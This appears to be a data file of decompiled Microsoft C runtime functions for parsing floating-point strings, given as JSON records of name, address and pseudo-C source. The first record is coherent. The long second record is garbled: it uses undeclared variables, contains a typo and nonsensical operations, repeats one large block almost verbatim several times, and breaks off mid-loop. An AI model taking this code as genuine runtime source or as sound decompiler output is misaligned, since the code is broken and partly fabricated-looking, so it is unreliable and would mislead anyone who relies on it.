{"Function Name": "__crt_strtox::assemble_floating_point_zero", "Address": "10020813", "Source Code": "void __cdecl __crt_strtox::assemble_floating_point_zero(bool is_non_zero, floating_point_value *fp_values)\n{\n    \n    if (fp_values[4] != (floating_point_value)0x0) {\n        \n        assemble_floating_point_zero<double>(is_non_zero, floating_point_value::as_double(fp_values));\n        return; \n    }\n    \n    *floating_point_value::as_float(fp_values) = (float)((uint)is_non_zero << 0x1f);\n}"}
{"Function Name": "__crt_strtox::convert_decimal_string_to_floating_type_common", "Address": "10020847", "Source Code": "\\*\nSLD_STATUS __cdecl\n__crt_strtox::convert_decimal_string_to_floating_type_common\n(floating_point_string *param_1, floating_point_value *param_2)\n{\n    uint uVar15; \n    uint uVar9;  \n    uint uVar7;  \n    uint *puVar12; \n    uint *puVar16; \n    uint *puVar17; \n    uint *local_91c; \n    uint *local_920; \n    uint *local_924; \n    uint *local_928; \n    uint *local_938; \n    uint *local_948; \n    uint local_94c; \n    uint local_950; \n    uint local_1d0; \n    uint local_1d8; \n    undefined8 local_578; \n    undefined8 local_744[57]; \n    undefined8 local_914[57]; \n    undefined local_b2c[460]; \n    \n    local_1d0 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    local_1d8 = (uint)param_1; \n    local_950 = (uint)(((param_2[4] == (floating_point_value)0x0) - 1 & 0x1d) + 0x19); \n    uVar15 = *(uint *)param_1; \n    if ((int)uVar15 < 0) { \n        uVar15 = 0; \n    }\n    uVar9 = *(uint *)(param_1 + 4); \n    uVar7 = uVar15; \n    if (uVar9 <= uVar15) { \n        uVar7 = uVar9; \n    }\n    puVar12 = (uint *)(param_1 + uVar7 + 8); \n    local_938 = (uint *)(uVar15 - uVar7); \n    local_924 = (uint *)((int)(param_1 + uVar9 + 8) - (int)puVar12); \n    puVar16 = (uint *)(param_1 + 8); \n    local_91c = (uint *)0x0; \n    uVar15 = 0; \n    local_920 = (uint *)0x0; \n    local_928 = puVar12; \n    \n    if (puVar16 != puVar12) {\n        do {\n            if (uVar15 == 9) { \n                puVar12 = local_91c; \n                if (local_91c != (uint *)0x0) { \n                    uVar15 = 0; \n                    puVar12 = (uint *)0x0; \n                    do {\n                        *(int *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4) *= 1000000000; \n                        puVar12 = (uint *)((int)puVar12 + 1); \n                    } while (puVar12 != local_91c); \n                    puVar12 = (uint *)local_1d8; \n                }\n            }\n            local_91c = puVar12; \n            if (local_920 != (uint *)0x0) { \n                puVar17 = (uint *)0x0; \n                puVar12 = local_920; \n                if (local_91c != (uint *)0x0) { \n                    do {\n                        *(byte **)((int)&local_1d8 + (int)((int)puVar17 + 1U) * 4) += (int)puVar12; \n                        puVar12 = (uint *)(uint)CARRY4((uint)pbVar11, (uint)puVar12); \n                        puVar17 = (uint *)((int)puVar17 + 1); \n                        local_91c = (uint *)local_1d8; \n                    } while (puVar17 != (uint *)local_1d8); \n                }\n                if (puVar12 != (uint *)0x0) { \n                    if (local_91c < (uint *)0x73) { \n                        *(uint **)((int)&local_1d8 + (int)((int)local_91c + 1) * 4) = puVar12; \n                        local_91c = (uint *)((int)(uint *)local_1d8 + 1); \n                        local_1d8._0_4_ = local_91c; \n                    } else {\n                        local_748 = (uint *)0x0; \n                        local_1d8._0_4_ = (uint *)0x0; \n                        _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0); \n                        local_91c = (uint *)local_1d8; \n                    }\n                }\n            }\n            local_920 = (uint *)((int)local_920 * 10 + (uint)*(byte *)puVar16); \n            uVar15++; \n            puVar16 = (uint *)((int)puVar16 + 1); \n        } while (puVar16 != puVar12); \n    }\n    \n    if (local_94c != 0) { \n        uVar15 = *(uint *)(&DAT_1003e9ec + local_94c * 2); \n        if (uVar15 == 0) { \n            local_748 = (uint *)0x0; \n            local_1d8._0_4_ = (uint *)0x0; \n            _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0); \n            local_91c = (uint *)local_1d8; \n        } else if ((uVar15 != 1) && (local_91c != (uint *)0x0)) { \n            uVar9 = 0; \n            puVar12 = (uint *)0x0; \n            do {\n                *(int *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4) *= (ulonglong)uVar15; \n                puVar12 = (uint *)((int)puVar12 + 1); \n            } while (puVar12 != local_91c); \n            local_91c = (uint *)local_1d8; \n            if (uVar9 == 0) { \n                goto LAB_10020e3f; \n            }\n            if ((uint *)0x72 < (uint *)local_1d8) { \n                goto LAB_10020e0e; \n            }\n            *(uint *)((int)&local_1d8 + (int)((int)(uint *)local_1d8 + 1) * 4) = uVar9; \n            local_1d8._0_4_ = (uint *)((int)(uint *)local_1d8 + 1); \n            local_91c = (uint *)local_1d8; \n        }\n    }\n    \n    if (local_938 == (uint *)0x0) { \n        if (local_91c == (uint *)0x0) { \n            goto LAB_1002137f; \n        }\n        uVar15 = *(uint *)((int)&local_1d8 + (int)local_91c * 4); \n        local_938 = (uint *)0x0; \n        iVar10 = 0x1f; \n        if (uVar15 != 0) { \n            for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n        }\n        if (uVar15 == 0) { \n            iVar10 = 0; \n        } else {\n            iVar10 = iVar10 + 1; \n        }\n        local_948 = (uint *)((int)((int)local_91c - 1U) * 0x20 + iVar10); \n    } else {\n        local_94c = (uint)local_938 % 10; \n        puVar12 = local_91c; \n        for (local_930 = (uint *)((uint)local_938 / 10); local_91c = puVar12, local_930 != (uint *)0x0; local_930 = (uint *)((int)local_930 - (int)local_948)) {\n            local_948 = local_930; \n            if ((uint *)0x26 < local_930) { \n                local_948 = (uint *)0x26; \n            }\n            uVar15 = (uint)(byte)(&DAT_1003e956)[(int)local_948 * 4]; \n            local_748 = (uint *)(uVar15 + (&DAT_1003e957)[(int)local_948 * 4]); \n            _memset(local_744, 0, uVar15 * 4); \n            FUN_10018670((undefined8 *)((int)local_744 + uVar15 * 4), (undefined8 *)(&UNK_1003e050 + (uint)*(ushort *)(&UNK_1003e954 + (int)local_948 * 4) * 4), (uint)bVar6 << 2); \n            uVar15 = local_1d8._4_4_; \n            if (local_748 < (uint *)0x2) { \n                if ((uint)local_744[0] == 0) { \n                    local_918 = (uint *)0x0; \n                    local_1d8._0_4_ = (uint *)0x0; \n                    _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0); \n                } else {\n                    if (((uint)local_744[0] == 1) || (puVar12 == (uint *)0x0)) { \n                        bVar19 = true; \n                    } else {\n                        uVar9 = 0; \n                        puVar16 = (uint *)0x0; \n                        do {\n                            *(int *)((int)&local_1d8 + (int)((int)puVar16 + 1) * 4) *= (ulonglong)*(uint *)((int)&local_1d8 + (int)((int)puVar16 + 1) * 4); \n                            puVar16 = (uint *)((int)puVar16 + 1); \n                        } while (puVar16 != puVar12); \n                        if (uVar9 != 0) { \n                            if ((uint *)0x72 < (uint *)local_1d8) { \n                                local_748 = (uint *)0x0; \n                                local_1d8._0_4_ = (uint *)0x0; \n                                _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0); \n                                bVar19 = false; \n                                local_91c = (uint *)local_1d8; \n                                goto LAB_100212fc; \n                            }\n                            *(uint *)((int)&local_1d8 + (int)((int)(uint *)local_1d8 + 1) * 4) = uVar9; \n                            local_1d8._0_4_ = (uint *)((int)(uint *)local_1d8 + 1); \n                        }\n                    }\n                }\n            } else {\n                if (puVar12 < (uint *)0x2) { \n                    local_1d8._0_4_ = local_748; \n                    _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, (int)local_748 << 2); \n                    if (uVar15 == 0) { \n                        local_748 = (uint *)0x0; \n                        _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0); \n                    }\n                    bVar19 = true; \n                    local_91c = (uint *)local_1d8; \n                    puVar12 = (uint *)local_1d8; \n                    if ((uVar15 != 1) && ((uint *)local_1d8 != (uint *)0x0)) { \n                        uVar9 = 0; \n                        puVar12 = (uint *)0x0; \n                        do {\n                            *(int *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4) *= (ulonglong)*(uint *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4); \n                            puVar12 = (uint *)((int)puVar12 + 1); \n                        } while (puVar12 != (uint *)local_1d8); \n                        goto LAB_1002111f; \n                    }\n                    goto LAB_10021978; \n                }\n                local_920 = (uint *)local_744; \n                if (puVar12 <= local_748) { \n                    local_920 = (uint *)((int)&local_1d8 + 4); \n                }\n                local_93c = (uint *)((int)&local_1d8 + 4); \n                puVar16 = puVar12; \n                local_928 = local_748; \n                if (puVar12 <= local_748) { \n                    local_93c = (uint *)local_744; \n                    puVar16 = local_748; \n                    local_928 = puVar12; \n                }\n                local_1d8._0_4_ = (uint *)0x0; \n                puVar12 = (uint *)0x0; \n                local_3a8._0_4_ = (uint *)0x0; \n                if (local_928 != (uint *)0x0) { \n                    local_920 = (uint *)((int)local_920 - ((int)local_3a8 + 4U)); \n                    do {\n                        local_938 = *(uint **)((int)local_920 + (int)local_3a8 + (int)((int)puVar12 + 1U) * 4); \n                        if (local_938 == (uint *)0x0) { \n                            if (puVar12 == (uint *)local_1d8) { \n                                *(undefined4 *)((int)local_3a8 + (int)((int)puVar12 + 1U) * 4) = 0; \n                                local_1d8._0_4_ = (uint *)((int)puVar12 + 1); \n                                local_3a8._0_4_ = (uint *)local_1d8; \n                            }\n                        } else {\n                            uVar15 = 0; \n                            local_934 = (uint *)0x0; \n                            puVar17 = puVar12; \n                            if (puVar16 != (uint *)0x0) { \n                                do {\n                                    if (puVar17 == (uint *)0x73) break; \n                                    if (puVar17 == (uint *)local_1d8) { \n                                        *(undefined4 *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4) = 0; \n                                        local_3a8._0_4_ = (uint *)((int)local_934 + 1) + (int)puVar12; \n                                    }\n                                    lVar20 = (ulonglong)local_93c[(int)local_934] * ZEXT48(local_938) + (ulonglong)uVar15; \n                                    uVar9 = (uint)lVar20; \n                                    puVar8 = (uint *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4); \n                                    uVar15 = *puVar8; \n                                    *puVar8 = *puVar8 + uVar9; \n                                    uVar15 = (int)((ulonglong)lVar20 >> 0x20) + (uint)CARRY4(uVar15, uVar9); \n                                    local_934 = (uint *)((int)local_934 + 1); \n                                    puVar17 = (uint *)((int)puVar17 + 1); \n                                    local_1d8._0_4_ = (uint *)local_3a8._0_4_; \n                                } while (local_934 != puVar16); \n                                do {\n                                    if (uVar15 == (uint *)0x0) break; \n                                    if (puVar17 == (uint *)0x73) goto LAB_10021a0f; \n                                    if (puVar17 == (uint *)local_1d8) { \n                                        *(undefined4 *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4) = 0; \n                                        local_3a8._0_4_ = (uint *)((int)puVar17 + 1); \n                                    }\n                                    puVar8 = (uint *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4); \n                                    uVar9 = *puVar8; \n                                    *puVar8 = *puVar8 + uVar15; \n                                    uVar15 = (uint)CARRY4(uVar9, uVar15); \n                                    puVar17 = (uint *)((int)puVar17 + 1); \n                                    local_1d8._0_4_ = (uint *)local_3a8._0_4_; \n                                } while (true); \n                            }\n                            if (puVar17 == (uint *)0x73) { \n                                LAB_10021a0f: \n                                local_918 = (uint *)0x0; \n                                local_1d8._0_4_ = (uint *)0x0; \n                                _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_914, 0); \n                                bVar19 = false; \n                                goto LAB_100212fc; \n                            }\n                        }\n                        puVar12 = (uint *)((int)pu12 + 1); \n                    } while (puVar12 != local_928); \n                }\n                _memcpy_s((void *)((int)local_3a8 + 4), 0x1cc, local_914, local_3a8._0_4_ << 2); \n                bVar19 = true; \n                LAB_10021efe: \n                local_924 = (uint *)local_3a8._0_4_; \n            }\n            LAB_10021f0a: \n            if (!bVar19) goto LAB_10022038; \n        }\n    }\n    if (local_950 != 0) { \n        local_938 = *(uint **)(&DAT_1003e9ec + local_950 * 2); \n        if (local_938 == (uint *)0x0) { \n            local_3a8._0_4_ = local_938; \n            _memcpy_s((void *)((int)local_3a8 + 4), 0x1cc, local_b2c, 0); \n            LAB_10021f71: \n            local_924 = (uint *)local_3a8._0_4_; \n        } else if ((local_938 != (uint *)0x1) && (local_924 != (uint *)0x0)) { \n            uVar15 = 0; \n            puVar16 = (uint *)0x0; \n            do {\n                lVar20 = ZEXT48(local_938) * (ulonglong)*(uint *)((int)local_3a8 + (int)((int)puVar16 + 1U) * 4) + (ulonglong)uVar15; \n                *(int *)((int)local_3a8 + (int)((int)puVar16 + 1U) * 4) = (int)lVar20; \n                uVar15 = (uint)((ulonglong)lVar20 >> 0x20); \n                puVar16 = (uint *)((int)puVar16 + 1); \n            } while (puVar16 != local_924); \n            if (uVar15 == 0) goto LAB_10021f71; \n            if ((uint *)0x72 < (uint)local_3a8._0_4_) { \n                goto LAB_10022038; \n            }\n            *(uint *)((int)local_3a8 + (int)(local_3a8._0_4_ + 1) * 4) = uVar15; \n            local_924 = (uint *)(local_3a8._0_4_ + 1); \n            local_3a8._0_4_ = local_924; \n        }\n    }\n    if (puVar12 == (uint *)0x0) { \n        uVar15 = 0; \n    } else {\n        uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n        local_938 = (uint *)0x0; \n        iVar10 = 0x1f; \n        if (uVar15 != 0) { \n            for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n        }\n        if (uVar15 == 0) { \n            iVar10 = 0; \n        } else {\n            iVar10 = iVar10 + 1; \n        }\n        uVar15 = (int)((int)puVar12 - 1U) * 0x20 + iVar10; \n    }\n    if (local_924 == (uint *)0x0) { \n        uVar9 = 0; \n    } else {\n        uVar9 = *(uint *)((int)local_3a8 + (int)local_924 * 4); \n        local_938 = (uint *)0x0; \n        iVar10 = 0x1f; \n        if (uVar9 != 0) { \n            for (; uVar9 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n        }\n        if (uVar9 == 0) { \n            iVar10 = 0; \n        } else {\n            iVar10 = iVar10 + 1; \n        }\n        uVar9 = (int)((int)local_924 - 1U) * 0x20 + iVar10; \n    }\n    local_92c = (uint *)(-(uint)(uVar15 < uVar9) & uVar9 - uVar15); \n    if (local_92c != (uint *)0x0) { \n        local_93c = (uint *)((uint)local_92c & 0x1f); \n        puVar16 = (uint *)((uint)local_92c >> 5); \n        local_94c = 0x20 - (int)local_93c; \n        local_928 = puVar16; \n        lVar20 = __allshl((byte)local_94c, 0); \n        uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n        local_950 = (int)lVar20 - 1; \n        iVar10 = 0x1f; \n        if (uVar15 != 0) { \n            for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n        }\n        local_938 = (uint *)~local_950; \n        if (uVar15 == 0) { \n            iVar10 = 0; \n        } else {\n            iVar10 = iVar10 + 1; \n        }\n        local_934 = (uint *)((int)puVar16 + (int)puVar12); \n        uStack_941 = (uint *)(0x20 - iVar10) < local_93c; \n        if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) { \n            bVar19 = true; \n        } else {\n            bVar19 = false; \n        }\n        if (((uint *)0x73 < local_934) || (bVar19)) { \n            local_578._0_4_ = (uint *)0x0; \n            _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0); \n            puVar12 = (uint *)local_578; \n        } else {\n            if ((uint *)0x71 < local_934) { \n                local_934 = (uint *)0x72; \n            }\n            local_930 = local_934; \n            if (local_934 != (uint *)0xffffffff) { \n                puVar17 = (uint *)((int)local_934 - (int)local_928); \n                ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4); \n                do {\n                    puVar16 = local_928; \n                    if (local_930 < local_928) break; \n                    if (puVar17 < puVar12) { \n                        local_940 = *ppuVar14; \n                    } else {\n                        local_940 = (uint *)0x0; \n                    }\n                    if ((uint *)((int)puVar17 - 1U) < puVar12) { \n                        puVar12 = ppuVar14[-1]; \n                    } else {\n                        puVar12 = (uint *)0x0; \n                    }\n                    ppuVar14 = ppuVar14 + -1; \n                    *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                        ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                        ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f); \n                    local_930 = (uint *)((int)local_930 - 1); \n                    puVar17 = (uint *)((int)puVar17 + -1); \n                    puVar12 = (uint *)local_578; \n                } while (local_930 != (uint *)0xffffffff); \n            }\n            if (puVar16 != (uint *)0x0) { \n                puVar18 = (undefined4 *)((int)&local_578 + 4); \n                for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) { \n                    *puVar18 = 0; \n                    puVar18 = puVar18 + 1; \n                }\n            }\n            local_578._0_4_ = (uint *)((int)local_934 + 1); \n            if (!(bool)uStack_941) { \n                local_578._0_4_ = local_934; \n            }\n            puVar12 = (uint *)local_578; \n        }\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948); \n    puVar16 = local_954; \n    if (local_948 != (uint *)0x0) { \n        if (local_954 < local_92c) { \n            bVar19 = true; \n            uVar2 = *(undefined *)(local_958 + 0xc2); \n            goto LAB_100225ea; \n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c); \n    }\n    if (puVar12 <= local_924) { \n        if (puVar12 < local_924) { \n            LAB_1002230a: \n            local_92c = (uint *)((int)local_92c + 1); \n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1); \n            if (pbVar11 != (byte *)0xffffffff) { \n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break; \n                    pbVar11 = pbVar11 + -1; \n                } while (pbVar11 != (byte *)0xffffffff); \n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a; \n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f); \n    puVar16 = (uint *)((uint)puVar16 >> 5); \n    local_94c = 0x20 - (int)local_93c; \n    local_928 = puVar16; \n    lVar20 = __allshl((byte)local_94c, 0); \n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n    local_950 = (int)lVar20 - 1; \n    iVar10 = 0x1f; \n    if (uVar15 != 0) { \n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n    }\n    local_938 = (uint *)~local_950; \n    if (uVar15 == 0) { \n        iVar10 = 0; \n    } else {\n        iVar10 = iVar10 + 1; \n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12); \n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c; \n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) { \n        bVar19 = true; \n    } else {\n        bVar19 = false; \n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) { \n        local_578._0_4_ = (uint *)0x0; \n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0); \n    } else {\n        if ((uint *)0x71 < local_934) { \n            local_934 = (uint *)0x72; \n        }\n        local_930 = local_934; \n        if (local_934 != (uint *)0xffffffff) { \n            puVar17 = (uint *)((int)local_934 - (int)local_928); \n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4); \n            do {\n                puVar16 = local_928; \n                if (local_930 < local_928) break; \n                if (puVar17 < puVar12) { \n                    local_940 = *ppuVar14; \n                } else {\n                    local_940 = (uint *)0x0; \n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) { \n                    puVar12 = ppuVar14[-1]; \n                } else {\n                    puVar12 = (uint *)0x0; \n                }\n                ppuVar14 = ppuVar14 + -1; \n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f); \n                local_930 = (uint *)((int)local_930 - 1); \n                puVar17 = (uint *)((int)puVar17 + -1); \n                puVar12 = (uint *)local_578; \n            } while (local_930 != (uint *)0xffffffff); \n        }\n        if (puVar16 != (uint *)0x0) { \n            puVar18 = (undefined4 *)((int)&local_578 + 4); \n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) { \n                *puVar18 = 0; \n                puVar18 = puVar18 + 1; \n            }\n        }\n        local_578._0_4_ = local_934; \n        if (!(bool)uStack_941) { \n            local_578._0_4_ = (uint *)((int)local_934 + 1); \n        }\n        puVar12 = (uint *)local_578; \n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948); \n    puVar16 = local_954; \n    if (local_948 != (uint *)0x0) { \n        if (local_954 < local_92c) { \n            bVar19 = true; \n            uVar2 = *(undefined *)(local_958 + 0xc2); \n            goto LAB_100225ea; \n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c); \n    }\n    if (puVar12 <= local_924) { \n        if (puVar12 < local_924) { \n            LAB_1002230a: \n            local_92c = (uint *)((int)local_92c + 1); \n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1); \n            if (pbVar11 != (byte *)0xffffffff) { \n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break; \n                    pbVar11 = pbVar11 + -1; \n                } while (pbVar11 != (byte *)0xffffffff); \n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a; \n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f); \n    puVar16 = (uint *)((uint)puVar16 >> 5); \n    local_94c = 0x20 - (int)local_93c; \n    local_928 = puVar16; \n    lVar20 = __allshl((byte)local_94c, 0); \n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n    local_950 = (int)lVar20 - 1; \n    iVar10 = 0x1f; \n    if (uVar15 != 0) { \n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n    }\n    local_938 = (uint *)~local_950; \n    if (uVar15 == 0) { \n        iVar10 = 0; \n    } else {\n        iVar10 = iVar10 + 1; \n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12); \n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c; \n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) { \n        bVar19 = true; \n    } else {\n        bVar19 = false; \n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) { \n        local_578._0_4_ = (uint *)0x0; \n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0); \n    } else {\n        if ((uint *)0x71 < local_934) { \n            local_934 = (uint *)0x72; \n        }\n        local_930 = local_934; \n        if (local_934 != (uint *)0xffffffff) { \n            puVar17 = (uint *)((int)local_934 - (int)local_928); \n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4); \n            do {\n                puVar16 = local_928; \n                if (local_930 < local_928) break; \n                if (puVar17 < puVar12) { \n                    local_940 = *ppuVar14; \n                } else {\n                    local_940 = (uint *)0x0; \n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) { \n                    puVar12 = ppuVar14[-1]; \n                } else {\n                    puVar12 = (uint *)0x0; \n                }\n                ppuVar14 = ppuVar14 + -1; \n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f); \n                local_930 = (uint *)((int)local_930 - 1); \n                puVar17 = (uint *)((int)puVar17 + -1); \n                puVar12 = (uint *)local_578; \n            } while (local_930 != (uint *)0xffffffff); \n        }\n        if (puVar16 != (uint *)0x0) { \n            puVar18 = (undefined4 *)((int)&local_578 + 4); \n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) { \n                *puVar18 = 0; \n                puVar18 = puVar18 + 1; \n            }\n        }\n        local_578._0_4_ = local_934; \n        if (!(bool)uStack_941) { \n            local_578._0_4_ = (uint *)((int)local_934 + 1); \n        }\n        puVar12 = (uint *)local_578; \n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948); \n    puVar16 = local_954; \n    if (local_948 != (uint *)0x0) { \n        if (local_954 < local_92c) { \n            bVar19 = true; \n            uVar2 = *(undefined *)(local_958 + 0xc2); \n            goto LAB_100225ea; \n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c); \n    }\n    if (puVar12 <= local_924) { \n        if (puVar12 < local_924) { \n            LAB_1002230a: \n            local_92c = (uint *)((int)local_92c + 1); \n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1); \n            if (pbVar11 != (byte *)0xffffffff) { \n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break; \n                    pbVar11 = pbVar11 + -1; \n                } while (pbVar11 != (byte *)0xffffffff); \n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a; \n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f); \n    puVar16 = (uint *)((uint)puVar16 >> 5); \n    local_94c = 0x20 - (int)local_93c; \n    local_928 = puVar16; \n    lVar20 = __allshl((byte)local_94c, 0); \n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n    local_950 = (int)lVar20 - 1; \n    iVar10 = 0x1f; \n    if (uVar15 != 0) { \n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n    }\n    local_938 = (uint *)~local_950; \n    if (uVar15 == 0) { \n        iVar10 = 0; \n    } else {\n        iVar10 = iVar10 + 1; \n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12); \n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c; \n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) { \n        bVar19 = true; \n    } else {\n        bVar19 = false; \n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) { \n        local_578._0_4_ = (uint *)0x0; \n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0); \n    } else {\n        if ((uint *)0x71 < local_934) { \n            local_934 = (uint *)0x72; \n        }\n        local_930 = local_934; \n        if (local_934 != (uint *)0xffffffff) { \n            puVar17 = (uint *)((int)local_934 - (int)local_928); \n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4); \n            do {\n                puVar16 = local_928; \n                if (local_930 < local_928) break; \n                if (puVar17 < puVar12) { \n                    local_940 = *ppuVar14; \n                } else {\n                    local_940 = (uint *)0x0; \n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) { \n                    puVar12 = ppuVar14[-1]; \n                } else {\n                    puVar12 = (uint *)0x0; \n                }\n                ppuVar14 = ppuVar14 + -1; \n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f); \n                local_930 = (uint *)((int)local_930 - 1); \n                puVar17 = (uint *)((int)puVar17 + -1); \n                puVar12 = (uint *)local_578; \n            } while (local_930 != (uint *)0xffffffff); \n        }\n        if (puVar16 != (uint *)0x0) { \n            puVar18 = (undefined4 *)((int)&local_578 + 4); \n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) { \n                *puVar18 = 0; \n                puVar18 = puVar18 + 1; \n            }\n        }\n        local_578._0_4_ = local_934; \n        if (!(bool)uStack_941) { \n            local_578._0_4_ = (uint *)((int)local_934 + 1); \n        }\n        puVar12 = (uint *)local_578; \n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948); \n    puVar16 = local_954; \n    if (local_948 != (uint *)0x0) { \n        if (local_954 < local_92c) { \n            bVar19 = true; \n            uVar2 = *(undefined *)(local_958 + 0xc2); \n            goto LAB_100225ea; \n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c); \n    }\n    if (puVar12 <= local_924) { \n        if (puVar12 < local_924) { \n            LAB_1002230a: \n            local_92c = (uint *)((int)local_92c + 1); \n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1); \n            if (pbVar11 != (byte *)0xffffffff) { \n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break; \n                    pbVar11 = pbVar11 + -1; \n                } while (pbVar11 != (byte *)0xffffffff); \n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a; \n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f); \n    puVar16 = (uint *)((uint)puVar16 >> 5); \n    local_94c = 0x20 - (int)local_93c; \n    local_928 = puVar16; \n    lVar20 = __allshl((byte)local_94c, 0); \n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n    local_950 = (int)lVar20 - 1; \n    iVar10 = 0x1f; \n    if (uVar15 != 0) { \n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} 